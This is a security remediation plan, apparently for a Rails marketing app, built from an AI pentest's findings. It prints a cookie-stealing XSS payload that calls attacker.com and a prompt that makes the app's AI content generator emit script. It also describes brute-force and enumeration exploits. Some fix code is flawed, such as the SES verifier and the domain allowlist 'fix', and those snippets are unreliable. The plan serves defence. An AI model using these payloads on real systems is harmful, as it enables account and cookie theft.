# Epic: Security Vulnerability Remediation - Shannon Pentest Findings

**Priority:** 🔴 CRITICAL - ACTIVE EXPLOITATION CONFIRMED
**Effort:** ~4-6 weeks
**Cost of Inaction:** Active account compromise, credential theft, data breach, compliance violations
**Scan Date:** 2026-02-12
**Scan Duration:** 4 hours 17 minutes
**Scan Cost:** $86.25
**Total Vulnerabilities:** 38+ identified
**Successfully Exploited:** 6 authentication vulnerabilities ⚠️

---

## ⚠️ EXECUTIVE SUMMARY - CRITICAL

Shannon AI pentest **successfully exploited 6 authentication vulnerabilities** with proof-of-concept attacks:

### ✅ **Confirmed Exploitable** (Immediate Action Required)

1. **API Brute Force (CRITICAL)** - Successfully cracked admin@demo.com account at 90 attempts/minute
2. **User Enumeration (HIGH)** - Extracted valid user emails (admin@demo.com, marketer@demo.com)
3. **Weak Password Policy (HIGH)** - Accepts "aaaaaaaaaa", enables password spraying
4. **Infinite API Key Validity (CRITICAL)** - Stolen keys provide permanent unauthorized access
5. **Missing Cache-Control (HIGH)** - Credentials cached on shared devices
6. **Password Reset Flooding (MEDIUM)** - 50 emails in 2.5 seconds, no rate limiting

### 🚨 **NEW Critical Discoveries**

- **CSRF Protection DISABLED** in production (`config.action_controller.allow_forgery_protection = false`)
- **AWS SES Webhooks** have NO signature verification (SSRF vector)
- **PostgreSQL** has no Row-Level Security (multi-tenant data isolation gap)
- **Rack::Attack** uses MemoryStore (bypassed in multi-container deployments)
- **Session fixation** vulnerability confirmed (session IDs don't rotate after login)
- **OAuth account takeover** risk (auto-links without password verification)

### 📊 **Additional Vulnerabilities Identified**

- **13 XSS vulnerabilities** (not exploited due to application instability, but code-confirmed)
- **7 SSRF vulnerabilities** (blocked by authentication, but would be critical if accessed)
- **4 authorization vulnerabilities** (horizontal IDOR, vertical privilege escalation)
- **1 SQL injection** (admin-only ORDER BY injection)

**Immediate Risk:** Production system is **actively vulnerable** to account takeover, credential theft, and data exfiltration

---

## Phase 0: EMERGENCY - Actively Exploited Vulnerabilities (Week 1)

**These vulnerabilities have been successfully exploited with proof-of-concept attacks. Fix immediately.**

### Story 0.1: Fix API Brute Force Vulnerability
**Priority:** 🔴 CRITICAL - ACTIVELY EXPLOITED
**Category:** Authentication
**Effort:** 0.5 days
**Vulnerability ID:** AUTH-VULN-07
**Exploit Evidence:** Successfully brute-forced admin@demo.com at 90 attempts/minute

**Description:**
API login endpoint (`POST /api/auth/login`) lacks rate limiting. Shannon successfully cracked the admin account by testing common passwords at 90 requests/minute.

**Proof of Exploitation:**
```bash
# Shannon's exploit achieved:
- Tested 10 passwords against admin@demo.com
- No throttling or lockout triggered
- Successfully discovered password: "password123"
- Obtained valid API key for full account access
```

**Acceptance Criteria:**
- [ ] Add Rack::Attack rules specific to API login:
  ```ruby
  Rack::Attack.throttle('api-login-email', limit: 5, period: 20.seconds) do |req|
    req.params['email'].presence if req.path == '/api/auth/login' && req.post?
  end
  ```
- [ ] Add account lockout after 5 failed attempts (15-minute duration)
- [ ] Log failed authentication attempts for monitoring
- [ ] Test: Cannot exceed 5 attempts per email in 20 seconds
- [ ] Return 429 status with clear error message

**Files to Modify:**
- `config/initializers/rack_attack.rb`
- `app/controllers/api/auth_controller.rb` (add lockout logic)

**Related Vulnerabilities:** Chained with AUTH-VULN-08 (user enumeration) for targeted attacks

---

### Story 0.2: Disable User Enumeration in Registration
**Priority:** 🔴 CRITICAL - ACTIVELY EXPLOITED
**Category:** Information Disclosure
**Effort:** 0.5 days
**Vulnerability ID:** AUTH-VULN-08
**Exploit Evidence:** Enumerated admin@demo.com, marketer@demo.com via explicit error messages

**Description:**
Registration endpoint returns "Email already registered" message, allowing attackers to enumerate all valid user accounts. Shannon successfully identified 2 admin accounts.

**Proof of Exploitation:**
```bash
# Shannon confirmed:
- admin@demo.com → "Email already registered" (422 status)
- marketer@demo.com → "Email already registered" (422 status)
- Timing attack: 0.249s (exists) vs 0.491s (available)
- Tested 20 emails in under 60 seconds, no rate limiting
```

**Acceptance Criteria:**
- [ ] Return generic message for all registration attempts:
  ```ruby
  render json: { message: "If this email is available, you'll receive a confirmation email." }, status: :ok
  ```
- [ ] Do NOT differentiate between existing and new emails
- [ ] Send confirmation email only if email is actually available
- [ ] Log attempts for existing emails (monitoring only, not user-visible)
- [ ] Test: Cannot determine if email exists from response

**Files to Modify:**
- `app/controllers/api/auth_controller.rb` (register action)

---

### Story 0.3: Implement Password Complexity Requirements
**Priority:** 🔴 CRITICAL - ACTIVELY EXPLOITED
**Category:** Authentication
**Effort:** 1 day
**Vulnerability ID:** AUTH-VULN-10
**Exploit Evidence:** Successfully registered accounts with "aaaaaaaaaa", "1111111111"

**Description:**
No password complexity requirements beyond 10-character minimum. Shannon successfully created accounts with trivial passwords, enabling password spraying attacks.

**Proof of Exploitation:**
```bash
# Shannon confirmed weak passwords accepted:
- "aaaaaaaaaa" (10 identical characters) ✅ Accepted
- "1111111111" (10 digits only) ✅ Accepted
- "passworddd" (dictionary word) ✅ Accepted
- "qwertyuiop" (keyboard pattern) ✅ Accepted
- All accounts fully functional with API keys
```

**Acceptance Criteria:**
- [ ] Require at least 3 of 4 character types:
  - Uppercase letter
  - Lowercase letter
  - Number
  - Special character
- [ ] Block common passwords (use `pwned` gem or similar)
- [ ] Block keyboard patterns (qwerty, asdf, etc.)
- [ ] Block repeated characters (aaaa, 1111, etc.)
- [ ] Minimum length: 12 characters (increase from 10)
- [ ] Show password strength indicator in UI
- [ ] Test: Weak passwords are rejected with clear error messages

**Implementation:**
```ruby
# app/models/user.rb
validates :password, format: {
  with: /\A(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,}\z/,
  message: "must be at least 12 characters and include uppercase, lowercase, number, and special character"
}

validate :not_common_password

def not_common_password
  common = %w[password password123 admin admin123 welcome letmein qwerty]
  errors.add(:password, "is too common") if common.include?(password&.downcase)
end
```

**Files to Modify:**
- `app/models/user.rb`
- `config/initializers/devise.rb` (update minimum length)

---

### Story 0.4: Implement API Key Expiration
**Priority:** 🔴 CRITICAL - ACTIVELY EXPLOITED
**Category:** Authentication
**Effort:** 2 days
**Vulnerability ID:** AUTH-VULN-14
**Exploit Evidence:** API keys remain valid indefinitely, tested with 10 repeated accesses

**Description:**
API keys never expire and have no automatic rotation. Shannon confirmed keys provide permanent access, enabling long-term unauthorized access if compromised.

**Proof of Exploitation:**
```bash
# Shannon confirmed:
- Obtained API key via registration
- Used same key 10 times with 1-second delay
- 100% success rate on all attempts
- Accessed multiple protected endpoints
- No expiration mechanism exists
```

**Acceptance Criteria:**
- [ ] Add `api_key_expires_at` column to users table
- [ ] Set default expiration: 90 days from generation
- [ ] Generate refresh tokens for mobile apps (30-day validity)
- [ ] Add API key rotation endpoint: `POST /api/auth/rotate_key`
- [ ] Invalidate old key when new one is generated
- [ ] Return `expires_at` in login/registration responses
- [ ] Check expiration on every API request
- [ ] Return 401 with clear error: "API key expired, please refresh"
- [ ] Add background job to clean up expired keys
- [ ] Test: Expired keys are rejected

**Migration:**
```ruby
class AddApiKeyExpiration < ActiveRecord::Migration[7.0]
  def change
    add_column :users, :api_key_expires_at, :datetime
    add_column :users, :api_refresh_token, :string
    add_column :users, :refresh_token_expires_at, :datetime

    # Set expiration for existing keys (90 days from now)
    User.where.not(api_key: nil).update_all(
      api_key_expires_at: 90.days.from_now
    )
  end
end
```

**Files to Modify:**
- `app/models/user.rb`
- `app/controllers/api/auth_controller.rb`
- Database migration

---

### Story 0.5: Enable CSRF Protection in Production
**Priority:** 🔴 CRITICAL - NEW DISCOVERY
**Category:** CSRF
**Effort:** 0.5 days
**Vulnerability ID:** NEW - CSRF-DISABLED

**Description:**
CSRF protection is **explicitly disabled** in production config. This allows attackers to forge requests from authenticated users.

**Vulnerable Code:**
```ruby
# config/environments/production.rb:62
config.action_controller.allow_forgery_protection = false  # CRITICAL VULNERABILITY
```

**Acceptance Criteria:**
- [ ] Enable CSRF protection in production:
  ```ruby
  config.action_controller.allow_forgery_protection = true
  ```
- [ ] Ensure all forms include `<%= csrf_meta_tags %>`
- [ ] API endpoints should skip CSRF (already configured with `skip_before_action :verify_authenticity_token`)
- [ ] Test all web forms still work
- [ ] Test API endpoints still work
- [ ] Monitor for CSRF failures in logs

**Files to Modify:**
- `config/environments/production.rb`

---

### Story 0.6: Add AWS SES Webhook Signature Verification
**Priority:** 🔴 CRITICAL - NEW DISCOVERY
**Category:** SSRF / Webhook Security
**Effort:** 1 day
**Vulnerability ID:** NEW - AWS-SES-NO-SIG

**Description:**
AWS SES webhook endpoint has NO signature verification, unlike Stripe/GitHub/Shopify webhooks. Attackers can forge SES webhooks to trigger SSRF attacks.

**Acceptance Criteria:**
- [ ] Implement AWS SNS signature verification for SES webhooks
- [ ] Validate `x-amz-sns-message-type` header
- [ ] Verify signature using AWS public certificate
- [ ] Confirm subscription requests before processing
- [ ] Reject unsigned or invalid requests (403 status)
- [ ] Log verification failures for monitoring
- [ ] Test: Forged webhooks are rejected

**Implementation:**
```ruby
# app/controllers/webhooks/ses_controller.rb
def verify_aws_signature!
  message = JSON.parse(request.body.read)
  sns = Aws::SNS::MessageVerifier.new

  unless sns.authentic?(request.body.read)
    render json: { error: 'Invalid signature' }, status: :forbidden
    return false
  end

  true
end

before_action :verify_aws_signature!
```

**Files to Modify:**
- `app/controllers/webhooks/ses_controller.rb`
- Add `aws-sdk-sns` gem to Gemfile

---

### Story 0.7: Implement Row-Level Security in PostgreSQL
**Priority:** 🟠 HIGH - NEW DISCOVERY
**Category:** Data Isolation
**Effort:** 3 days
**Vulnerability ID:** NEW - NO-RLS

**Description:**
PostgreSQL has no Row-Level Security policies. In a multi-tenant application, this creates data leakage risk if application-level authorization fails.

**Acceptance Criteria:**
- [ ] Enable RLS on all entity-scoped tables
- [ ] Create policies enforcing entity_id filtering
- [ ] Set `current_setting('app.current_entity_id')` on connection
- [ ] Test: Cannot query other entities' data via SQL injection
- [ ] Verify performance impact (add indexes if needed)

**Implementation:**
```sql
-- Enable RLS on contacts table
ALTER TABLE contacts ENABLE ROW LEVEL SECURITY;

CREATE POLICY entity_isolation_policy ON contacts
  USING (entity_id = current_setting('app.current_entity_id')::integer);

-- Repeat for all entity-scoped tables
```

**Files to Modify:**
- Create migration: `db/migrate/add_row_level_security.rb`
- `config/initializers/database.rb` (set current_entity_id)

---

## Phase 1: Critical Vulnerabilities (Week 1-2)

### Story 1.1: Implement Content Security Policy (CSP)
**Priority:** 🔴 Critical
**Category:** XSS Prevention
**Effort:** 3 days

**Description:**
CSP is currently completely disabled (commented out in config). This allows all XSS payloads to execute unrestricted.

**Acceptance Criteria:**
- [ ] Enable CSP in `config/initializers/content_security_policy.rb`
- [ ] Configure policy:
  - `default-src 'self'`
  - `script-src 'self' 'nonce-{random}'` (use nonce for inline scripts)
  - `style-src 'self' 'unsafe-inline'` (initially, then move to nonces)
  - `img-src 'self' data: https:`
  - `connect-src 'self'`
  - `frame-ancestors 'self'`
- [ ] Add nonce generation for legitimate inline scripts
- [ ] Test all features (Scout chat, landing pages, email editor)
- [ ] Monitor CSP violation reports

**Files to Modify:**
- `config/initializers/content_security_policy.rb`
- All views with inline `<script>` tags

---

### Story 1.2: Fix Session Fixation Vulnerability
**Priority:** 🔴 Critical
**Category:** Authentication
**Effort:** 1 day
**Vulnerability ID:** AUTH-VULN-01

**Description:**
Session IDs don't rotate after login, allowing attackers to fix a victim's session ID and hijack it after authentication.

**Acceptance Criteria:**
- [ ] Add `config.authentication_keys = [:email]` to Devise config
- [ ] Enable session regeneration: `reset_session` in `SessionsController#create`
- [ ] Verify with test: session ID changes after login
- [ ] Test across all authentication methods (web, API, OAuth, MFA)

**Test Script:**
```ruby
# test/integration/session_fixation_test.rb
test "session ID rotates after successful login" do
  session_before = cookies['_amos_labs_session']
  post user_session_path, params: { user: { email: 'test@example.com', password: 'password123' } }
  session_after = cookies['_amos_labs_session']
  assert_not_equal session_before, session_after
end
```

**Files to Modify:**
- `config/initializers/devise.rb`
- `app/controllers/users/sessions_controller.rb`

---

### Story 1.3: Fix OAuth Account Takeover
**Priority:** 🔴 Critical
**Category:** Authentication
**Effort:** 2 days
**Vulnerability ID:** AUTH-VULN-04

**Description:**
OAuth callback auto-links Google accounts to existing email-based accounts without password verification. Attacker can create Google account with victim's email and take over their account.

**Attack Vector:**
1. Victim has account: `victim@example.com` (password-based)
2. Attacker creates Google account: `victim@example.com`
3. Attacker signs in with Google OAuth
4. System auto-links to victim's account without verification
5. Attacker gains full access

**Acceptance Criteria:**
- [ ] **Do NOT auto-link** OAuth to existing accounts
- [ ] If OAuth email matches existing account:
  - Require password verification before linking
  - OR create separate OAuth-only account
  - OR show error: "Email already registered, please login with password"
- [ ] Use OAuth `sub` claim (immutable user ID) instead of email for user identification
- [ ] Add account linking flow in user settings (authenticated users can link OAuth)
- [ ] Add tests for OAuth scenarios

**Files to Modify:**
- `app/controllers/users/omniauth_callbacks_controller.rb`
- `app/models/user.rb` (OAuth lookup logic)

---

### Story 1.4: Encrypt Sensitive Credentials in Database
**Priority:** 🔴 Critical
**Category:** Authentication / Data Protection
**Effort:** 3 days
**Vulnerability IDs:** AUTH-VULN-05, AUTH-VULN-06

**Description:**
API keys, TOTP secrets, and trusted device tokens are stored in **plaintext** in PostgreSQL. Database breach = full compromise.

**Acceptance Criteria:**
- [ ] Use `lockbox` gem or Rails 7 built-in encryption
- [ ] Encrypt columns:
  - `users.api_key` → migrate to `users.api_key_encrypted` (already exists!)
  - `users.otp_secret` (TOTP)
  - `trusted_devices.device_token`
- [ ] Generate and secure master encryption key (`LOCKBOX_MASTER_KEY` env var)
- [ ] Create migration to encrypt existing plaintext data
- [ ] Update all reads/writes to use encrypted columns
- [ ] Add rotation mechanism for compromised keys
- [ ] Test: Can still authenticate with API keys and TOTP after encryption

**Migration Example:**
```ruby
class EncryptSensitiveCredentials < ActiveRecord::Migration[7.0]
  def up
    # Encrypt existing API keys
    User.find_each do |user|
      if user.api_key.present?
        user.update_column(:api_key_encrypted, encrypt(user.api_key))
        user.update_column(:api_key, nil)
      end
    end
  end
end
```

**Files to Modify:**
- `app/models/user.rb`
- `app/models/trusted_device.rb`
- `config/initializers/lockbox.rb` (new)
- Database migration

---

### Story 1.5: Add Cache-Control Headers to Authentication Responses
**Priority:** 🔴 Critical
**Category:** Authentication
**Effort:** 0.5 days
**Vulnerability ID:** AUTH-VULN-02

**Description:**
Authentication responses lack `Cache-Control: no-store` headers, allowing browsers/proxies to cache sensitive session data.

**Acceptance Criteria:**
- [ ] Add headers to all authentication endpoints:
  - `Cache-Control: no-store, no-cache, must-revalidate, private`
  - `Pragma: no-cache`
- [ ] Apply to:
  - `/users/sign_in`
  - `/api/auth/login`
  - `/users/auth/google_oauth2/callback`
  - `/mfa/*` endpoints
- [ ] Verify with browser DevTools: Response headers include no-cache

**Implementation:**
```ruby
# app/controllers/concerns/no_cache_headers.rb
module NoCacheHeaders
  extend ActiveSupport::Concern

  def set_no_cache_headers
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private'
    response.headers['Pragma'] = 'no-cache'
  end
end

# In authentication controllers:
before_action :set_no_cache_headers, only: [:create, :new]
```

**Files to Modify:**
- `app/controllers/users/sessions_controller.rb`
- `app/controllers/api/auth_controller.rb`
- `app/controllers/users/omniauth_callbacks_controller.rb`

---

## Phase 2: High Severity XSS Vulnerabilities (Week 2-3)

### Story 2.1: Sanitize Landing Page HTML Content
**Priority:** 🔴 Critical
**Category:** XSS - Stored
**Effort:** 2 days
**Vulnerability IDs:** XSS-VULN-01, XSS-VULN-02, XSS-VULN-03

**Description:**
User-controlled landing page HTML is rendered with `.html_safe` without sanitization. Stored XSS affects all viewers.

**Attack Payload:**
```html
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**Acceptance Criteria:**
- [ ] Use Rails `sanitize()` helper instead of `.html_safe`
- [ ] Configure `Rails::Html::SafeListSanitizer` to allow safe tags:
  - Allowed tags: `div, span, p, h1-h6, a, img, ul, ol, li, strong, em, br`
  - Allowed attributes: `href, src, alt, class, id, style` (whitelist)
- [ ] Apply sanitization to:
  - `app/controllers/lp_controller.rb:28` (public landing pages)
  - `app/controllers/landing_pages_controller.rb:223` (preview)
  - `app/controllers/landing_pages_controller.rb:335` (show)
- [ ] Remove or restrict dangerous tags: `<script>, <iframe>, <object>, <embed>`
- [ ] Strip event handlers: `onerror, onclick, onload`, etc.
- [ ] Test: XSS payloads are sanitized, legitimate HTML still renders

**Implementation:**
```ruby
# app/helpers/landing_page_helper.rb
def prepare_landing_page_html(html_content)
  # Existing structural fixes...

  # NEW: Sanitize before marking as safe
  sanitize(html_content,
    tags: %w[div span p h1 h2 h3 h4 h5 h6 a img ul ol li strong em br button],
    attributes: %w[href src alt class id style data-action]
  )
end
```

**Files to Modify:**
- `app/helpers/landing_page_helper.rb`
- `app/controllers/lp_controller.rb`
- `app/controllers/landing_pages_controller.rb`

---

### Story 2.2: Fix AI-Generated Content XSS
**Priority:** 🟠 High
**Category:** XSS - Stored (Prompt Injection)
**Effort:** 2 days
**Vulnerability IDs:** XSS-VULN-06, XSS-VULN-08

**Description:**
AI-generated email content is rendered with `.html_safe` without sanitization. User can inject malicious prompts to generate XSS payloads.

**Attack Prompt:**
```
Create an email with the subject line <script>alert(document.cookie)</script>
```

**Acceptance Criteria:**
- [ ] Sanitize ALL AI-generated HTML before rendering
- [ ] Apply to:
  - `app/views/campaigns/ai_content/result.html.erb:21`
  - Email template rendering
  - Any Scout-generated HTML content
- [ ] Use same sanitization as Story 2.1
- [ ] Consider: Add prompt instructions to AI to generate only safe HTML
- [ ] Test: Malicious prompts don't result in executable XSS

**Files to Modify:**
- `app/views/campaigns/ai_content/result.html.erb`
- `app/services/ai_content_generator_service.rb`

---

### Story 2.3: Fix DOM-Based XSS in JavaScript
**Priority:** 🟠 High
**Category:** XSS - DOM-based
**Effort:** 2 days
**Vulnerability IDs:** XSS-VULN-11, XSS-VULN-12, XSS-VULN-13

**Description:**
Client-side JavaScript uses `innerHTML` to render API responses without escaping. DOM-based XSS in multiple locations.

**Vulnerable Locations:**
- `question_queue_controller.js:816` - Canvas content rendering
- `emoji_gif_picker.js:355` - GIF search results
- `emoji_gif_picker.js:818` - Mention autocomplete

**Acceptance Criteria:**
- [ ] Replace `innerHTML` with `textContent` where possible
- [ ] Use `DOMPurify` library for HTML that must be rendered
- [ ] Update JavaScript:
  ```javascript
  // BEFORE (vulnerable):
  element.innerHTML = apiResponse.content;

  // AFTER (safe):
  import DOMPurify from 'dompurify';
  element.innerHTML = DOMPurify.sanitize(apiResponse.content);
  ```
- [ ] Apply to all 3 vulnerable locations
- [ ] Test: API responses with `<script>` tags are sanitized

**Files to Modify:**
- `app/javascript/controllers/question_queue_controller.js`
- `app/javascript/controllers/emoji_gif_picker.js`
- `package.json` (add `dompurify` dependency)

---

## Phase 3: Authorization Vulnerabilities (Week 3)

### Story 3.1: Fix Image Asset Horizontal IDOR
**Priority:** 🟠 High
**Category:** Authorization
**Effort:** 1 day
**Vulnerability ID:** AUTHZ-VULN-01

**Description:**
Users within same entity can access private images of other users. Only entity-level scope is checked, not user-level ownership.

**Vulnerable Code:**
```ruby
# app/controllers/api/image_assets_controller.rb:119-123
def set_image_asset
  @image_asset = current_entity.image_assets.find(params[:id])  # Missing user check!
end
```

**Acceptance Criteria:**
- [ ] Add user-level authorization to `set_image_asset`
- [ ] Use existing `visible_to_user` scope (already defined in model)
- [ ] Apply to actions: `show`, `destroy`, `toggle_sharing`
- [ ] Test:
  - User A can access their own private images
  - User A **cannot** access User B's private images (same entity)
  - User A **can** access shared images (`shared_with_entity: true`)

**Fix:**
```ruby
def set_image_asset
  @image_asset = current_entity.image_assets
                               .visible_to_user(current_user)
                               .find(params[:id])
rescue ActiveRecord::RecordNotFound
  render json: { error: 'Image not found' }, status: :not_found
end
```

**Files to Modify:**
- `app/controllers/api/image_assets_controller.rb`
- Add test: `test/controllers/api/image_assets_controller_test.rb`

---

### Story 3.2: Add Role Authorization to Admin Platform Evolution
**Priority:** 🟠 High
**Category:** Authorization - Vertical Privilege Escalation
**Effort:** 1 day
**Vulnerability IDs:** AUTHZ-VULN-02, AUTHZ-VULN-03

**Description:**
Admin viewer role can approve AI code fixes and merge PRs to production. Should require editor/super_admin privileges.

**Acceptance Criteria:**
- [ ] Add role checks to `Admin::PlatformEvolutionController`:
  ```ruby
  before_action -> { authorize_admin!(:editor) }, only: [:approve_fix, :reject_fix]
  before_action -> { authorize_admin!(:super_admin) }, only: [:merge_pr]
  ```
- [ ] Helper `authorize_admin!` already exists in `Admin::BaseController`
- [ ] Test:
  - Viewer role: blocked from approve/merge actions
  - Editor role: can approve, **cannot** merge
  - Super_admin role: can do everything

**Files to Modify:**
- `app/controllers/admin/platform_evolution_controller.rb`
- Add test: `test/controllers/admin/platform_evolution_controller_test.rb`

---

### Story 3.3: Fix Entity Role Authorization Table Confusion
**Priority:** 🟡 Medium
**Category:** Authorization
**Effort:** 0.5 days
**Vulnerability ID:** AUTHZ-VULN-04

**Description:**
`require_entity_admin` checks wrong database table (`User.role` instead of `EntityUser.role`), potentially allowing privilege escalation.

**Vulnerable Code:**
```ruby
# app/controllers/entity/base_controller.rb:34
def require_entity_admin
  unless current_user&.entity_admin?  # Missing entity parameter!
    # ...
  end
end
```

**Acceptance Criteria:**
- [ ] Pass `current_entity` to `entity_admin?` check
- [ ] Verify it uses `EntityUser.role` (correct multi-tenant authorization)
- [ ] Test: Member role cannot access admin-only entity actions

**Fix:**
```ruby
def require_entity_admin
  unless current_user&.entity_admin?(current_entity)  # Now checks EntityUser.role
    flash[:alert] = "You don't have permission to perform this action"
    redirect_to root_path and return
  end
end
```

**Files to Modify:**
- `app/controllers/entity/base_controller.rb`

---

## Phase 4: Rate Limiting & User Enumeration (Week 4)

### Story 4.1: Add Rate Limiting to API Authentication Endpoints
**Priority:** 🟡 Medium
**Category:** Authentication - Brute Force Prevention
**Effort:** 1 day
**Vulnerability ID:** AUTH-VULN-07

**Description:**
API login endpoints lack rate limiting, allowing brute force attacks to bypass web protections.

**Acceptance Criteria:**
- [ ] Add `Rack::Attack` rules for:
  - `POST /api/auth/login` - 5 attempts per 20s per IP, 10 per hour per email
  - `POST /api/auth/register` - 3 attempts per hour per IP
  - `POST /users/password` (reset) - 3 attempts per hour per email
- [ ] Match existing web login rate limits
- [ ] Return 429 status with `Retry-After` header
- [ ] Monitor rate limit hits in logs

**Implementation:**
```ruby
# config/initializers/rack_attack.rb
Rack::Attack.throttle('api-login-ip', limit: 5, period: 20.seconds) do |req|
  req.ip if req.path == '/api/auth/login' && req.post?
end

Rack::Attack.throttle('api-login-email', limit: 10, period: 1.hour) do |req|
  if req.path == '/api/auth/login' && req.post?
    req.params['email'].presence
  end
end
```

**Files to Modify:**
- `config/initializers/rack_attack.rb`

---

### Story 4.2: Fix User Enumeration in Registration Endpoint
**Priority:** 🟡 Medium
**Category:** Information Disclosure
**Effort:** 0.5 days
**Vulnerability ID:** AUTH-VULN-08

**Description:**
API registration returns "Email already registered" message, allowing attackers to enumerate valid user accounts.

**Acceptance Criteria:**
- [ ] Return **generic message** regardless of email existence:
  - "Registration request received. Check your email for verification."
- [ ] Send email only if account doesn't exist
- [ ] Log registration attempts for existing emails (monitoring)
- [ ] Apply same pattern to password reset (already secure)

**Files to Modify:**
- `app/controllers/api/auth_controller.rb` (register action)

---

## Phase 5: SSRF Prevention (Week 4-5)

### Story 5.1: Implement Centralized URL Validation Library
**Priority:** 🟠 High
**Category:** SSRF Prevention
**Effort:** 3 days
**Vulnerability IDs:** SSRF-VULN-01 through SSRF-VULN-07

**Description:**
No URL validation exists. Application vulnerable to AWS metadata theft, internal service access, local file inclusion via `file://` protocol.

**Acceptance Criteria:**
- [ ] Create `UrlValidator` service class
- [ ] Features:
  - Protocol whitelist (HTTP/HTTPS only, block `file://`)
  - Block private IP ranges (10.x, 172.16-31.x, 192.168.x)
  - Block localhost/loopback (127.0.0.1, ::1, 0.0.0.0)
  - Block cloud metadata endpoints (169.254.169.254, metadata.google.internal)
  - DNS resolution + IP validation (prevent DNS rebinding)
  - IPv6 validation (block IPv4-mapped addresses like `::ffff:127.0.0.1`)
  - Block redirect following (or re-validate after redirect)
- [ ] Apply to all SSRF sinks:
  - `WebProxyController` (VULN-01)
  - `ExternalAgentWebhookService` (VULN-02)
  - `DocumentProcessorService` (VULN-04)
  - `WebPageCaptureService` (VULN-05)
  - `AutomationContext` (VULN-06)
  - `IntegrationApiService` (VULN-07)
- [ ] Test: All SSRF attack vectors are blocked

**Implementation:**
```ruby
# app/services/url_validator.rb
class UrlValidator
  BLOCKED_HOSTS = ['169.254.169.254', 'metadata.google.internal'].freeze
  PRIVATE_RANGES = [
    IPAddr.new('10.0.0.0/8'),
    IPAddr.new('172.16.0.0/12'),
    IPAddr.new('192.168.0.0/16'),
    IPAddr.new('127.0.0.0/8'),
    IPAddr.new('::1/128'),
    IPAddr.new('fc00::/7')
  ].freeze

  def self.validate!(url, allow_private: false)
    uri = URI.parse(url)

    # Protocol whitelist
    raise ArgumentError, "Invalid protocol" unless ['http', 'https'].include?(uri.scheme)

    # Resolve DNS to IP
    ip = Resolv.getaddress(uri.host)
    addr = IPAddr.new(ip)

    # Check private ranges
    if !allow_private && PRIVATE_RANGES.any? { |range| range.include?(addr) }
      raise ArgumentError, "Private IP not allowed"
    end

    # Check blocklist
    raise ArgumentError, "Blocked host" if BLOCKED_HOSTS.include?(uri.host)

    { uri: uri, resolved_ip: ip }
  end
end
```

**Files to Create:**
- `app/services/url_validator.rb`
- `test/services/url_validator_test.rb`

**Files to Modify:**
- All 7 vulnerable files listed above

---

### Story 5.2: Disable HTTP Redirect Following
**Priority:** 🟠 High
**Category:** SSRF Prevention
**Effort:** 1 day
**Vulnerability ID:** SSRF-VULN-03

**Description:**
HTTP clients follow redirects without re-validation, allowing attackers to bypass URL validation via redirect chains.

**Acceptance Criteria:**
- [ ] Configure `HTTParty.follow_redirects = false` globally
- [ ] Configure `Net::HTTP` to not follow redirects
- [ ] Replace `URI.open()` with controlled HTTP client (no auto-redirect)
- [ ] If redirects are needed, manually validate each hop
- [ ] Test: Redirect to `169.254.169.254` is blocked

**Files to Modify:**
- `config/initializers/http_clients.rb` (new)
- `app/services/document_processor_service.rb`
- `app/controllers/web_proxy_controller.rb`

---

### Story 5.3: Fix Domain Allowlist Suffix Matching
**Priority:** 🟡 Medium
**Category:** SSRF Prevention
**Effort:** 1 day
**Vulnerability ID:** SSRF-VULN-06

**Description:**
Automation domain allowlist uses suffix matching. Attacker can register `evil-api.stripe.com` to bypass allowlist.

**Vulnerable Code:**
```ruby
unless allowed.any? { |d| uri.host&.end_with?(d) }  # Suffix matching!
```

**Acceptance Criteria:**
- [ ] Use exact matching with proper subdomain wildcard:
  ```ruby
  # For wildcard: *.stripe.com
  allowed_pattern = ".stripe.com"
  uri.host == "stripe.com" || uri.host.end_with?(allowed_pattern)
  ```
- [ ] Apply to `AutomationContext` validation
- [ ] Test: `evil-api.stripe.com` is blocked, `pay.stripe.com` is allowed

**Files to Modify:**
- `app/services/automation_context.rb`

---

### Story 5.4: Fix Integration API Default-Allow Vulnerability
**Priority:** 🟡 Medium
**Category:** SSRF Prevention
**Effort:** 0.5 days
**Vulnerability ID:** SSRF-VULN-07

**Description:**
Integration `host_allowed?` defaults to **allow all** if allowlist is empty. Should default to deny.

**Acceptance Criteria:**
- [ ] Change default behavior:
  ```ruby
  # BEFORE:
  return true if allowed_hosts.blank?  # Vulnerable!

  # AFTER:
  return false if allowed_hosts.blank?  # Secure default
  ```
- [ ] Update existing integrations to have explicit allowlists
- [ ] Test: Blank allowlist blocks all requests

**Files to Modify:**
- `app/services/integration_api_service.rb`

---

## Phase 6: Testing & Validation (Week 5-6)

### Story 6.1: Add Security Integration Tests
**Priority:** 🟡 Medium
**Effort:** 3 days

**Acceptance Criteria:**
- [ ] XSS test suite:
  - Test all sanitization helpers with known payloads
  - Verify CSP headers in responses
  - Test DOM-based XSS prevention
- [ ] Authentication test suite:
  - Session fixation prevention
  - OAuth account linking security
  - Cache-Control headers
  - Rate limiting enforcement
- [ ] Authorization test suite:
  - Horizontal IDOR prevention
  - Vertical privilege escalation blocks
  - Role-based access control
- [ ] SSRF test suite:
  - URL validation against known bypass techniques
  - Metadata endpoint blocking
  - Redirect following prevention
  - DNS rebinding protection

**Files to Create:**
- `test/integration/xss_prevention_test.rb`
- `test/integration/authentication_security_test.rb`
- `test/integration/authorization_security_test.rb`
- `test/integration/ssrf_prevention_test.rb`

---

### Story 6.2: Add Security Monitoring & Alerting
**Priority:** 🟡 Medium
**Effort:** 2 days

**Acceptance Criteria:**
- [ ] Log security events:
  - Rate limit violations
  - Failed authorization attempts
  - Blocked SSRF attempts
  - CSP violations (via report-uri)
- [ ] Set up alerts for:
  - Multiple failed auth attempts (brute force detection)
  - Repeated SSRF blocks (active reconnaissance)
  - Admin privilege escalation attempts
- [ ] Create security dashboard showing:
  - Failed auth attempts by IP
  - Blocked requests by type
  - Rate limit violations

**Files to Create:**
- `app/services/security_logger.rb`
- Security monitoring documentation

---

## Success Metrics

**Security KPIs:**
- [ ] Zero externally exploitable XSS vulnerabilities
- [ ] Zero session fixation vulnerabilities
- [ ] Zero OAuth account takeover vectors
- [ ] Zero horizontal IDOR vulnerabilities
- [ ] Zero SSRF vectors with working authentication
- [ ] 100% of sensitive credentials encrypted at rest
- [ ] All authentication endpoints have rate limiting
- [ ] CSP enabled and enforced application-wide

**Testing Coverage:**
- [ ] 90%+ test coverage for all security fixes
- [ ] All Shannon findings have corresponding tests
